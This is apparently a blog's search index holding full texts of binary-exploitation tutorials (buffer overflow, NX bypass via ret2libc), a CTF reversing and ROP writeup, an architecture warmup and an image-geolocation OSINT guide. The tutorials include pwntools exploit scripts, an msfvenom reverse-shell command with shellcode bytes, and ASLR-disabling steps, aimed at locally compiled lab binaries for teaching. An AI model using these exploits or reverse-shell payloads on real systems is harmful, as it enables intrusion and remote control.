[{"content":"","permalink":"https://the-root-user.github.io/blog/projects/p03-expdev/","summary":"Docker container for Exploit Dev","title":"expdev"},{"content":"In this post we are going to learn an exploit mitigation technique: what it is and how to bypass it.\nNew to the series? check out my previous posts here.\nNo Execute Last time, we put shellcode on the stack and called it to get code execution. In modern binaries, usually what happens is that the stack is not executable, means we can put something on the stack but it will only be considered a piece of data by the program and not some cpu instruction. This technique is called NX (No eXecute) or DEP (Data Execution Prevention).\nAlthough the data on the stack is not executable, making a function call and passing required/desired arguments is still allowed. We\u0026rsquo;re going to make use of this fact.\nWhen we are writing code for a program, we don\u0026rsquo;t write code for print and such functions. They are said to be built-ins. When we compile the program, the compiler links the program to a library (shared object) in which it would be able to find definitions of those functions during execution. Such programs are termed as Dynamically Linked which we mostly deal with, while on the contrary are Statically Linked programs which we won\u0026rsquo;t discuss right now.\nMost of the C programs - whether it\u0026rsquo;s x86 or x64 - rely on libc, the default C library.\nWe can see the shared objects (libraries) being used by a program, with the ldd command Terminal Since during the program execution, the program is making use of library functions, so the library (libc) is mapped in memory. We can abuse this by finding memory addresses and making calls to other functions present in the library as per our need. print, write, system, exit, etc are some of the functions present in the libc out of which, for now, we are most interested in system. This technique is called return2libc, ret2libc or ret2system.\nSetup Using the code from previous exercise: vulnerable.c #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; int overflow(){ char buffer[500]; int userinput; userinput = read(0, buffer, 700); printf(\u0026#34;\\nUser provided %d bytes. Buffer content is: %s\\n\u0026#34;, userinput, buffer); return 0; } int main(int argc, char *argv[]){ overflow(); return 0; } Compile with the command: Terminal gcc -m32 -fno-stack-protector vulnerable.c -o vulnerable Notice that we are not using the -z execstack flag anymore, which makes the stack executable.\nOur program has following protections: Terminal Before proceeding any further, remember to disable ASLR.\nExploitation We find the offset of EIP to be 516. You know how, right?\nWe want to execute system(\u0026quot;/bin/sh\u0026quot;) for which we are going to overwrite the EIP with the address of the system function, and then we\u0026rsquo;ll give the return address which can be anything (e.g JUNK) but we will keep it to be the address of the exit function so that our program terminates nicely. Lastly, we will give the function arguments which, in present case, would be the address of the /bin/sh string. Remember stack alignment? revise here\nWith the vmmap command in gdb, we can confirm that the libc/certain sections of libc are loaded into the program Terminal Let\u0026rsquo;s get our required memory addresses with gdb: Terminal Now that we have all we needed, let\u0026rsquo;s construct our exploit: exploit.py from pwn import * exe = \u0026#34;./vulnerable\u0026#34; elf = context.binary = ELF(exe,checksec=False) system_addr = 0xf7dff040 exit_addr = 0xf7df1990 binsh_addr = 0xf7f46338 padding = \u0026#34;A\u0026#34;*516 payload = flat(padding, system_addr, exit_addr, binsh_addr) #write(\u0026#34;payload\u0026#34;,payload) io = process(exe) io.sendline(payload) io.interactive() Let\u0026rsquo;s run the exploit: Terminal And.. Yea! we got our shell \u0026#x1f525;\n","permalink":"https://the-root-user.github.io/blog/posts/pwn-0x02-nx-bypass/","summary":"Stack is not allowing code execution? Let\u0026rsquo;s bypass it","title":"Pwn 0x02: NX Bypass"},{"content":" Sweet-HTB\n","permalink":"https://the-root-user.github.io/blog/projects/p02-sweet-htb/","summary":"Modern theme for Hackers, with dark colors - Inspired from the UI of Hackthebox","title":"Sweet-HTB"},{"content":"\u0026#x1f4a1; Rizin is a fork of radare2, one of the most popular reverse engineering tools.\nReversing Warmup We run strings on the binary and get our flag:\nTerminal I later ran the binary, and it just gave the flag. Silly me! Terminal Can You C Me Running the binary asks us for correct password which we don\u0026rsquo;t know yet.\nUpon opening the binary with rizin, we can see our flag right there but it\u0026rsquo;s scattered. We can also see another string which resembles a password. Terminal Providing that password to the binary, we get our flag: Terminal Modulus Encryption The flag for the challenge has been encrypted using the encryption.py python script and the generated output is the output.txt file. Our goal is to decrypt the flag.\nThe script is taking input data as flag.txt. The encrypt function gets the unicode code of each character present in the file with ord() and adds some integers to it. Then, it converts the characters back to ASCII with chr(). Terminal We take the encrypted data output.txt as input. After getting the unicode, instead of adding, we modify the original technique a bit by subtracting the integers and then converting back to ASCII.\nUpon running the modified script, we get the flag. Terminal Make it Go! Running the binary asks us to enter password.\nOpening the challenge file in rizin, we seek to main function and disassemble it. Terminal Going a bit down, we can see the Enter_Password string which is later being printed in the console with a call to Fprint: Terminal Going futher down, we see there is the call to Fscanln which is taking user input. In the next instructions, there\u0026rsquo;s a string comparison being made and then there is the jne (jump if not equal) instruction from which we can deduce that there\u0026rsquo;s a condition being checked.\nWe can see that the user input is being compared to 0x45ea856. Terminal On providing the hex number to our binary, we get the flag: Terminal Pokemon Evolution \u0026#x1f4a1; Here is a nice resource for ROP.\nWe are given challege files as pokemon_challenge.zip. The binary prints out some ASCII art and asks us for input Feed :\nWe open the challenge binary in cutter (GUI for rizin). I have the decompiler plugin installed, so we navigate to Decompiler tab.\nAlong main and register_name functions, we can see another function hacked. In the decompiled code, we can see that an if condition is checking the function arguments. We can also see the values against which the params are being compared. Let\u0026rsquo;s keep note of these values.\nAfter trying random input lengths for quite a bit, the offset for RIP comes out to be 24. Terminal Now that we have RIP under control, we need to find the memory addresses of hacked funtion and ROP gadgets.\nAs we studied here, if the binary was 32-bit, we could have just pushed the function arguments onto the stack. But, as our binary is 64-bit and arguments are being accessed through registers, we\u0026rsquo;ll take the help of ROP gadgets to achieve our goal.\nWe can find the memory address of the hacked function with gdb and ROP gadgets with ropper.\nTerminal Terminal Putting it all together, our final exploit script looks like this: VSCodium - exploit.py 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 #!/usr/bin/python from pwn import * def start(argv=[], *a, **kw): if args.REMOTE: # (\u0026#39;server\u0026#39;, \u0026#39;port\u0026#39;) return remote(sys.argv[1], sys.argv[2], *a, **kw) else: # Run locally return process([exe] + argv, *a, **kw) exe = \u0026#39;./pokemon_evolve\u0026#39; elf = context.binary = ELF(exe, checksec=False) padding=\u0026#34;A\u0026#34;*24 hacked_function_addr = 0x40119a pop_rdi = 0x401196 pop_rsi = 0x401198 payload = flat(padding, pop_rdi, 0xdeadbeefdeadbeef, pop_rsi, 0xc0debabec0debabe, hacked_function_addr) io = start() io.recvuntil(\u0026#34;Feed :\u0026#34;) io.sendline(payload) io.interactive() On running the exploit, we successfully execute hacked function and bypass the conditional check by providing right arguments which, along with the beautiful dragon, returns the contents of flag.txt. Terminal Since I did the challenge really late, the remote server wasn\u0026rsquo;t responding anymore and I could pwn the binary locally only.\nInitially, my exploit wasn\u0026rsquo;t working and I was going mad about it.\nLater, @MoLover shared his exploit script with offset 24 while my exploit had 22. Thanks to him, as soon as I changed the offset of RIP in my exploit it, eventually, worked!\n","permalink":"https://the-root-user.github.io/blog/posts/ncc-ctf-2022/","summary":"Walkthrough of Reversing \u0026amp; Binary Exploitation challenges presented at NED Cyber Community CTF 2022","title":"NCC CTF 2022 - Rev \u0026 BinExp Challenges Writeup"},{"content":"In this post, we will see what is a buffer overflow and will exploit it to get code execution. Do Not feel overwhelmed. Just follow along and we\u0026rsquo;ll have fun.\nIf you are new to the series, check out my previous posts here\nThe Stack Take this C program:\nprogram.c #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; int helper(){ system(\u0026#34;/bin/sh\u0026#34;); // executes system shell } int overflow(){ char buffer[500]; // declaring buffer variable with specified size int userinput; userinput = read(0, buffer, 700); // reading user input into buffer variable printf(\u0026#34;\\nUser provided %d bytes. Buffer content is: %s\\n\u0026#34;, userinput, buffer); return 0; } int main(int argc, char *argv[]){ overflow(); return 0; } If we break down the program from the main function, it calls the overflow function which declares a variable of size 500 bytes and then, reads user input into that variable. Later, it prints the size of the provided input along with the input itself.\nAfter compiling, here\u0026rsquo;s what the program does: Terminal We have to compile the program with the following command: Terminal gcc -m32 -fno-stack-protector -z execstack program.c -o program Also, we need to disable ASLR with the following command: Terminal echo 0 | sudo tee /proc/sys/kernel/randomize_va_space Everytime you reboot your machine, you\u0026rsquo;ll have to do this step again.\nWhat's going on? Modern programs come with a bunch of exploit mitigations. For example, we can see the protections on the ping binary which is mostly present on linux as well as windows, with checksec script. Terminal So, initially we\u0026rsquo;ll be working with those protections disabled and that is why we\u0026rsquo;re giving those extra flags to gcc.\nHere we can see the protections on our (compiled) program: Terminal For now, you don\u0026rsquo;t need to care about them. We\u0026rsquo;ll learn to bypass some anti-exploit mechanisms later on.\nIn general, the stack is aligned this way: Since our program is not dealing with any arguments, so, in our case, it\u0026rsquo;s like this: Stack Abuse What if we give the program some unexpected input? What if we give an input, more in magnitude than the defined buffer is supposed to handle?\nLet\u0026rsquo;s take a look.\nWhen we give an input bigger than a defined buffer, if the program is vulnerable, we overwrite other stuff that is already present on the stack.\nOur goal is to overwrite the return address of the function so that we can point the EIP to a memory address of our own choice. Normally, one can just get creative and give a program random inputs until something desirable is received back :)\nDeep Dive Let\u0026rsquo;s give our program some random inputs, with the help of Python.\n(You know we can pipe the output of one command to another, right?)\nTerminal Hnmm.. so, eventually, we broke the program!\nLet\u0026rsquo;s generate a pattern with cyclic utility and analyse the program with gdb to determine the offset of EIP.\nAlternative One can also use metasploit\u0026rsquo;s msf-pattern_create and msf-pattern_offset to achieve the same result.\nTerminal We get the offset to be 516.\nNow, we will send calculated input to see if we can control the EIP.\nTerminal And.. Yes! We can see 0x42424242, the hex code for the 4 B\u0026rsquo;s we sent.\nEIP Control When we have EIP under control, one of the first things we can do is to reuse the dead code present inside a binary.\nDead Code is a piece of code within a program which is not used when the program executes.\nCode Reuse We can see that the helper function isn\u0026rsquo;t called during the program execution. Since we have control over the EIP, we can point it to the helper function to get it executed.\nFor that purpose, we need the memory address of the helper function. We can find it with gdb as:\nTerminal Our binary is 32-bit and 32-bit programs use little-endian, due to which we have to provide the memory address in reverse bytes order.\nTerminal But.. we still get segmentation fault.\nNo need to worry. This is a common thing in exploit dev. Let\u0026rsquo;s arrange the bytes a little bit and see what happens.\nTerminal Yay! Did you see? a new process /usr/bin/dash started.. Our Shell!\nBut, wait.. it also did exit even before we could interact with it.\nWhat happens under the hood is that a child process dash is started which operates by getting input from user (like bash or sh) but the parent process (our program) is done with its job and exits. The child process with no input, consequently, also exits.\nWe can take help of cat command to make the terminal wait for input.\nBut, for convenience, we are going to use an awesome tool, a python library, pwntools to make our exploitation process easy.\nPwntools\nHere\u0026rsquo;s a nice little exploit:\nvim - exploit.py 1 2 3 4 5 6 7 8 9 10 #!/bin/python3 from pwn import * exe = \u0026#39;./program\u0026#39; payload=flat(\u0026#34;A\u0026#34;*516,0x565561b9) io = process(exe) io.sendline(payload) io.interactive() Upon running the exploit, we successfully get a system shell and can execute arbitrary commands \u0026#x1f525;\nTerminal Shellcode The helper function made the exploitation very easy for us this time but, normally, we don\u0026rsquo;t have such a luxury very often. Then what are we supposed to do?\nWell, we can put machine/shell code on the stack and then point the EIP to it to achieve code execution.\nFor now, we are going to use msfvenom, an automated tool to generate the shellcode for us with this command: Terminal msfvenom -p linux/x86/shell_reverse_tcp lhost=127.0.0.1 lport=1236 -b \u0026#34;\\x00\u0026#34; -f py Terminal We will use gdb and take note of the memory address from where our buffer starts. Terminal We\u0026rsquo;re giving dumb input (just A\u0026rsquo;s) so that we can easily see our buffer. Terminal We can see that our buffer is starting on the second line. Keep note of the memory address 0xffffcc18.\nExploitation Let\u0026rsquo;s prepare our exploit: exploit.py #!/bin/python3 from pwn import * exe = \u0026#39;./program\u0026#39; elf = context.binary = ELF(exe, checksec=False) buf = b\u0026#34;\u0026#34; buf += b\u0026#34;\\xbf\\x48\\x8a\\xd9\\x40\\xd9\\xec\\xd9\\x74\\x24\\xf4\\x5e\\x29\u0026#34; buf += b\u0026#34;\\xc9\\xb1\\x12\\x83\\xc6\\x04\\x31\\x7e\\x0e\\x03\\x36\\x84\\x3b\u0026#34; buf += b\u0026#34;\\xb5\\xf7\\x43\\x4c\\xd5\\xa4\\x30\\xe0\\x70\\x48\\x3e\\xe7\\x35\u0026#34; buf += b\u0026#34;\\x2a\\x8d\\x68\\xa6\\xeb\\xbd\\x56\\x04\\x8b\\xf7\\xd1\\x6f\\xe3\u0026#34; buf += b\u0026#34;\\x78\\x22\\x90\\xf2\\xee\\x20\\x90\\xf0\\x3a\\xad\\x71\\x48\\xa4\u0026#34; buf += b\u0026#34;\\xfe\\x20\\xfb\\x9a\\xfc\\x4b\\x1a\\x11\\x82\\x1e\\xb4\\xc4\\xac\u0026#34; buf += b\u0026#34;\\xed\\x2c\\x71\\x9c\\x3e\\xce\\xe8\\x6b\\xa3\\x5c\\xb8\\xe2\\xc5\u0026#34; buf += b\u0026#34;\\xd0\\x35\\x38\\x85\u0026#34; payload=flat(\u0026#34;\\x90\u0026#34;*16,buf,\u0026#34;A\u0026#34;*(500-len(buf)),0xffffcc18) write(\u0026#34;payload\u0026#34;,payload) We have inserted a NOP slide (\\x90) in the payload before the shell code.\nA NoOPeration instruction tells the CPU to do nothing (and just move to next instruction). Even if the stack alignment gets changed a bit, our NOP instructions won\u0026rsquo;t let our (noted) memory address go useless.\nLet\u0026rsquo;s run the exploit to get our payload.\nWe run the program with a breakpoint set and feed to it the payload. Then, we see what\u0026rsquo;s there on the stack: Terminal Terminal Let\u0026rsquo;s setup a netcat listener in another terminal. Terminal \u0026lt;2\u0026gt; Now, let\u0026rsquo;s continue: Terminal Gdb is telling us that a new program is launched.\nOn switching to our second terminal, the one with listener.. we can see: Terminal \u0026lt;2\u0026gt; Vola! We got our reverse shell \u0026#x1f525; \u0026#x1f60e;\n","permalink":"https://the-root-user.github.io/blog/posts/pwn-0x01-buffer-overflow/","summary":"WTH is a buffer overflow? Let\u0026rsquo;s do it","title":"Pwn 0x01: Buffer Overflow"},{"content":"! We will not be diving deep into things but only as much as necessary. For further learning, I\u0026rsquo;ll link relevant resources.\n0.1 Prerequisites Basic Computer Science knowledge Fundamental knowledge of C - here is a nice tutorial Curiosity - Consistency Optional Since, at first, we will be doing exploit development on Linux, it would be nice to learn the necessary things here Some Assembly knowledge will benefit you a lot - here is a nice tutorial Gdb is going to play a key role in our exploit dev - here\u0026rsquo;s a lovely tutorial 0.2 Memory Structure High-level overview More here 0.3 Architectures Comparison Here\u0026rsquo;s a C program:\nprogram.c #include \u0026lt;stdio.h\u0026gt; void print_user_data(char* arg1, char* arg2, char* arg3){ printf(\u0026#34;Here is Your data\\n\u0026#34;); printf(\u0026#34;Name: %s Age: %s Job: %s\\n\u0026#34;, arg1, arg2, arg3); } void main(int argc, char **argv){ if (argc!=4) { printf(\u0026#34;Please provide 3 inputs\\n\u0026#34;); } else { print_user_data(argv[1], argv[2], argv[3]); } } The program takes some command line arguments from the user, checks if they are equivalent to 3 and then passes them to another function which prints some data on the console.\nAfter compiling the code with gcc as: Terminal gcc code.c -o code or Terminal make code make command is just another shortcut for us (for gcc)\nHere\u0026rsquo;s what it does: Terminal Simple enough, right?\nWhen we execute a binary, the binary name and the arguments to its function(s) are stored on the stack (in memory). They are accessed differently in different architectures.\nAfter seeing the disassembled binaries of both archs, you will notice that the length of memory addresses changes. But.. wait\nHow are the command line arguments being parsed in memory?\nLet\u0026rsquo;s compile the code, disassemble it, and see what\u0026rsquo;s happening under the curtains.\nx32 Compile the code with the command: gcc -m32 code.c -o code\nWhy -m32? When we're on a 64-bit OS, the -m32 flag tells the compiler (gcc) to compile the code and give us a 32-bit binary. If you are on 32-bit machine, you can skip it. Disassembly You can just follow along with the tutorial, but if you\u0026rsquo;re curious how I disassembled the binary, here you go.\nThere are many a ways/tools to disassemble a binary. Here, I have used gdb in the following way: Terminal gdb code # \u0026#39;code\u0026#39; is the name of our binary b main # instructing gdb to break at main function disassemble main # disassemble the main function Terminal In the case of 32-bit binary, we can see that first, the arguments are being pushed onto the stack and then the call to our function print_user_data is made. They are later popped off the stack before the program exits.\nx64 Compile the code with the command: gcc code.c -o code\nDisassembly Terminal On the other hand, in the case of 64-bit binary, arguments are first moved into registers and then our function print_user_data is called.\nNow that you understand the distinction between the two, it will come in handy later on, as we will be putting 32-bit binaries to test more frequently for simplicity.\n0.4 ELF The last thing to be aware of are the ELF files. Wondering what they are?\nELF files, short for Executable and Linkable Format, are standard executables for Linux and other Unix OSs (not exactly but, think of them as the EXE files on Windows).\nAnd as for our current program, since we compiled it on Linux, it also is an ELF file. Terminal We might discuss ELF files in detail later on. For further study, here\u0026rsquo;s a nice video.\n","permalink":"https://the-root-user.github.io/blog/posts/pwn-0x00-warmup/","summary":"Let\u0026rsquo;s get ready to Pwn","title":"Pwn 0x00: Warmup"},{"content":"","permalink":"https://the-root-user.github.io/blog/projects/p01-nmap-auto/","summary":"A Bash script to fascilitate your Hacking journey","title":"nmap-auto"},{"content":" The awesome Urban Shot used in this article was created by Artua\nThis article is going to be focused on geolocating images, specifically using Landmarks.\nGeolocation means finding the real world location of an object, such as the place where a photograph was taken. This process is rather straightforward but there are various methods - some more creative than others - of doing so. You don\u0026rsquo;t always get enough clues from an image\u0026rsquo;s metadata (data about data) and most images won\u0026rsquo;t typically show a famous landmark in the background to help you locate the area, town or even country.\nAccording to GEOINT Analyst Benjamin Strick, there are 5 key elements one should consider when looking at an image:\nContext Foreground Background Map markings Trial and error Methodology: Reduce Your Area of Interest Context Usually we have a context in which the image was produced or shared, called context clues. For example, things like type of architecture, important landmarks and any other clues where this location could be in relation to land. Any piece of information, no matter how minor it may appear, could give an image more context. As an example, while searching for a missing person, an image of a banana leaf led investigators to research where banana production exists in the world.\nOne of the more obvious ways we can geolocate an image is to look at the image details:\nWho posted the image? Where was it posted? Does it contain metadata? Is there a location tagged on social media? Your investigation also serves as context.\nImage Analysis Be creative and scan the image for visual clues. Look for Point-Of-Interests in the image like its landscape, terrain, road layouts, a river, bridge, statue or a steep hill or for unique features like vegetation, specific trees, windows, street art, business names, architectural details like light-posts, balconies or rooftops in the Background as well as Foreground.\nReverse image search One of the methods for geolocating an image is to do an image reverse search. This means that if the image has been indexed by search engines we may find the exact image or we can do a visual or crop search to help us find similar images. Remember that changing the crop and the keywords for searching an image may yield completely different results.\nI like to use this browser addon to ease the workflow when I find images online that I want to do an image reverse on: Addon description: \u0026ldquo;Perform a search by image. Choose between the image search engines Google, Bing, Yandex, TinEye and Baidu.\u0026rdquo;\nChrome: https://chrome.google.com/webstore/search/RevEye%20Reverse%20Image%20Search?hl=no Firefox: https://addons.mozilla.org/nb-NO/firefox/addon/reveye-ris/ Let\u0026rsquo;s see an Example Consider we are provided below image for analysis:\nFrom the things we discussed above, we can see some odd buildings which really stand out and something like a playground in the background (marked in red). If we pay close attention, we notice something in the foreground (marked in cyan) also which, probably, is a railing. We can later use it for confirmation purposes like actually from where the photo was taken.\nKeeping these point of interests in sight, a reverse image search tells us that the image was taken in London and the skyscrapers and railing help confirm it.\nMap Markings Orienting an image on a map provides valuable insights. If compared to Traditional mapping platforms, Local mapping platforms or data sets sometimes provide more valuable information. Sources like Weather Underground can be used to check historical weather data to corroborate image dates with weather at various locations, WolframAlpha to establish a time frame based on rainfall or London Street Trees to locate a particular type of tree across the city. SunCalc is another useful resource to identify a particular location using the sun\u0026rsquo;s direction and shadow in an image.\nA tool like Wikimapia allows users to annotate maps, include adding the names and locations of various structures. We can later add place marks on Google Earth or Google Maps as they have variety of different other options.\nKeep an Eye for what is NOT in your image/video? During a Bellingcat investigation to geolocate an image of mass executions in or near Benghazi, a Twitter user noticed the color of the sand was grey compared to other areas of Benghazi, where colors of the sand are more orange or yellow. This tip helped investigators identify the location to be in the southwest area of Benghazi. Furthermore, this was the first instance when (in August 2017) the International Criminal Court (ICC) issued its first ever arrest warrant solely based on evidence gathered via social media.\nTrial and Error Sometimes you need to revisit previous assumptions. When you feel like giving up, go back repeatedly and revisit your assumptions, check if any possible suspicion or guess may be correct or not. Try to look for what is not in an image. Even when an image shows no clear horizon, the lack of a horizon could become just as useful to reduce your area of interest.\nFurther Tips While geolocatting, it\u0026rsquo;s important to know what is and isn\u0026rsquo;t likely to be in a country. For example, it is unlikely for a regular Catholic church to appear in places where Budhism / Islam is the most popular religion. The language used on the shops and vehicles matter too. We can use Google translate to predict what language it could be. Which side of the road the cars are on, the license plates, the markings on the road (different countries have different markings), the style of traffic lights, the clothing choices of those walking around.\nTo be good at geolocation, we\u0026rsquo;ve got to open our eyes to all that could be. In your country, for example, it may be common to wear coats during the winter periods. However, in other countries it may not be (think). Even the smallest of things that we wouldn\u0026rsquo;t normally think twice about can reveal to us the possible location.\nStill wandering? Here\u0026rsquo;s a nice (beginner) geolocation challenge write-up https://www.secjuice.com/geolocation-osint-amateur-hour/ For Improving Skills Follow @quiztime on Twitter Play a lot of Geoguesser! References Benjamin Strick (on Twitter): https://twitter.com/BenDoBrown Weather Underground: https://www.wunderground.com/history WolframAlpha: https://www.wolframalpha.com/examples/science-and-technology/weather-and-meteorology/ London Street Trees: https://apps.london.gov.uk/street-trees/ SunCalc: https://www.suncalc.org/ Wikimapia: https://wikimapia.org/ Geoguesser: https://geoguessr.com/ Identify a location from a photo or video: https://youtu.be/RoqWbpZUOSo Robin Taylor\u0026rsquo;s session \u0026ldquo;More Than Meets the Eye: Geolocation for human rights investigations\u0026rdquo; at the Investigation is Collaboration conference: https://cdn.ttc.io/s/exposingtheinvisible.org/iic-conf/slides/Geolocation_RTaylor.pdf OSINT Geo Location: https://rallypoint.withyouwithme.com/cyber_challenges/osint-geo-location/ Geolocation Techniques - Mapping Landmarks: https://www.bellingcat.com/resources/how-tos/2014/07/15/geolocation-techniques-mapping-landmarks/ Google Earth: https://earth.google.com/ Google Maps: https://www.google.com/maps Bellingcat: https://www.bellingcat.com/ ","permalink":"https://the-root-user.github.io/blog/posts/geoint/","summary":"A byte sized lesson on geolocating images","title":"GEOINT: Geo-locating Images Using Landmarks"}]